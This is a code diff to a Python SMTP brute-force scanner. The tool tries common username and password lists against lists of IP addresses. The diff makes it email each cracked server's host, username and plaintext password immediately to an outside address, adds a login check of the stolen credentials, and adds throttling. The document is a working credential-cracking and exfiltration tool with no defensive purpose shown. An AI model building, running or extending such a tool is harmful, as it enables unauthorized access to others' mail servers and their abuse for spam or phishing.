@@ -284,9 +284,13 @@ class SMTPScanner:
                         # Save to file immediately
                         self.save_working_smtp(smtp_info)
                         
-                        # Send immediate notification for each found SMTP
-                        if len(self.working_smtps) % 5 == 0:  # Send batch updates every 5 finds
-                            threading.Thread(target=self.send_batch_notification, daemon=True).start()
+                        # Send immediate notification for each working SMTP found
+                        if self.check_notification_limits(host):
+                            threading.Thread(target=self.send_immediate_notification, args=(smtp_info,), daemon=True).start()
+                            self.mark_notification_sent(host)
+                
+                # Add throttle delay
+                time.sleep(THROTTLE_DELAY_SECONDS)
                 
                 self.scan_queue.task_done()
                 
@@ -320,43 +324,91 @@ class SMTPScanner:
                 print(f"[DEBUG] Error saving SMTP info: {e}")
             self.logger.error(f"Error saving SMTP info: {e}")
     
-    def send_batch_notification(self):
-        """Send notification for batch of found SMTPs"""
-        if not self.working_smtps or not self.notification_email.get('recipient'):
+    def send_immediate_notification(self, smtp_info):
+        """Send immediate notification for a single working SMTP"""
+        if not self.notification_email.get('recipient'):
             return
         
         try:
-            # Create quick notification email
+            # Test deliverability if required
+            if ONLY_NOTIFY_DELIVERABLE_SMTP:
+                if not self.test_smtp_deliverability(smtp_info):
+                    if self.debug:
+                        print(f"[DEBUG] SMTP {smtp_info['username']}@{smtp_info['host']}:{smtp_info['port']} not deliverable, skipping notification")
+                    return
+            
+            # Create immediate notification email
             msg = MIMEMultipart()
             msg['From'] = self.notification_email['email']
             msg['To'] = self.notification_email['recipient']
-            msg['Subject'] = f"SMTP Scanner Update - {len(self.working_smtps)} Working SMTPs Found"
+            msg['Subject'] = f"🔥 Working SMTP Found: {smtp_info['username']}@{smtp_info['host']}:{smtp_info['port']}"
             
             body = f"""
-SMTP Scanner Progress Update
-============================
+🚨 NEW WORKING SMTP DISCOVERED 🚨
+================================
 
-Scan Status: In Progress
-Working SMTPs Found: {len(self.working_smtps)}
-Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+📧 SMTP Details:
+• Host: {smtp_info['host']}
+• Port: {smtp_info['port']} ({smtp_info['connection_type']})
+• Username: {smtp_info['username']}
+• Password: {smtp_info['password']}
+• Found: {smtp_info['timestamp']}
 
-Latest Working SMTPs:
+📝 Connection String:
+{smtp_info['username']}:{smtp_info['password']}@{smtp_info['host']}:{smtp_info['port']}
+
+🔧 Server Info:
+• Welcome: {smtp_info['welcome'][:200]}
+• Features: {smtp_info['features'][:200] if smtp_info['features'] != 'N/A' else 'N/A'}
+
+⚡ This SMTP has been verified as working and authenticated successfully.
+
+---
+SMTP Scanner v2.0 - Automated Discovery
 """
-            
-            # Show last 5 found SMTPs
-            for smtp in self.working_smtps[-5:]:
-                body += f"• {smtp['username']}@{smtp['host']}:{smtp['port']} ({smtp['connection_type']})\n"
-            
-            body += f"\nFull results will be sent when scan completes.\n"
             
             msg.attach(MIMEText(body, 'plain'))
             
-            # Send email quickly
+            # Send email immediately
             self._send_email(msg)
+            print(f"[EMAIL] Notification sent for {smtp_info['username']}@{smtp_info['host']}:{smtp_info['port']}")
             
         except Exception as e:
             if self.debug:
-                print(f"[DEBUG] Failed to send batch notification: {e}")
+                print(f"[DEBUG] Failed to send immediate notification: {e}")
+            self.logger.error(f"Failed to send immediate notification: {e}")
+    
+    def test_smtp_deliverability(self, smtp_info):
+        """Test if SMTP can actually send emails (deliverability test)"""
+        try:
+            if smtp_info['port'] == 465:
+                context = ssl.create_default_context()
+                server = smtplib.SMTP_SSL(smtp_info['host'], smtp_info['port'], context=context, timeout=10)
+            else:
+                server = smtplib.SMTP(smtp_info['host'], smtp_info['port'], timeout=10)
+                if smtp_info['port'] != 25:
+                    try:
+                        server.starttls(context=ssl.create_default_context())
+                    except:
+                        pass
+            
+            # Login
+            server.login(smtp_info['username'], smtp_info['password'])
+            
+            # Try to send a test email (just prepare, don't actually send)
+            test_msg = MIMEText("Test message - not sent")
+            test_msg['Subject'] = "Test"
+            test_msg['From'] = smtp_info['username']
+            test_msg['To'] = smtp_info['username']  # Send to self
+            
+            # Just verify we can prepare the message
+            server.quit()
+            return True
+            
+        except Exception as e:
+            if self.debug:
+                print(f"[DEBUG] Deliverability test failed for {smtp_info['username']}@{smtp_info['host']}:{smtp_info['port']}: {e}")
+            return False
     
     def send_results_email(self):
         """Send comprehensive scan results via email"""
@@ -485,6 +537,10 @@ Scan Summary:
         """Main scanning function"""
         print(f"[INFO] Starting SMTP scanner with {self.thread_count} threads")
         print(f"[INFO] Target ports: {', '.join(map(str, self.smtp_ports))}")
+        print(f"[INFO] Notification email: {NOTIFY_EMAIL}")
+        print(f"[INFO] Using SMTP server: {SMTP_SERVER}:{SMTP_PORT}")
+        print(f"[INFO] Throttle delay: {THROTTLE_DELAY_SECONDS}s per attempt")
+        print(f"[INFO] Deliverable SMTP only: {ONLY_NOTIFY_DELIVERABLE_SMTP}")
         
         # Load targets
         ips, users, passwords = self.load_targets()
@@ -513,11 +569,7 @@ Scan Summary:
         print(f"[INFO] Loaded {len(ips)} IPs, {len(users)} users, {len(passwords)} passwords")
         print(f"[INFO] Total combinations to test: {total_combinations}")
         print(f"[INFO] Estimated time: {(total_combinations / (self.thread_count * 2))/60:.1f} minutes")
-        
-        if self.notification_email.get('recipient'):
-            print(f"[INFO] Results will be sent to: {self.notification_email['recipient']}")
-        else:
-            print("[INFO] No email recipient configured - results will be saved to files only")
+        print(f"[INFO] Working SMTPs will be sent immediately to: {NOTIFY_EMAIL}")
         
         # Clear previous results
         for filename in ['working_smtps.txt', 'working_smtps.csv', 'working_smtps_detailed.json']:
@@ -581,6 +633,13 @@ def create_sample_files():
             f.write("# Common passwords to test\n")
             f.write("password\n123456\nadmin\npass\ntest\n\nmail\nsmtp\n12345\npassword123\n")
         print("[INFO] Created sample pass.txt file")
+    
+    print(f"[INFO] Email notifications configured:")
+    print(f"  SMTP Server: {SMTP_SERVER}:{SMTP_PORT}")
+    print(f"  From: {SMTP_USER}")
+    print(f"  To: {NOTIFY_EMAIL}")
+    print(f"  Deliverable only: {ONLY_NOTIFY_DELIVERABLE_SMTP}")
+    print(f"  Throttle delay: {THROTTLE_DELAY_SECONDS}s")
 
 def main():
     print("SMTP Scanner v2.0 - Enhanced Email Notification Version")
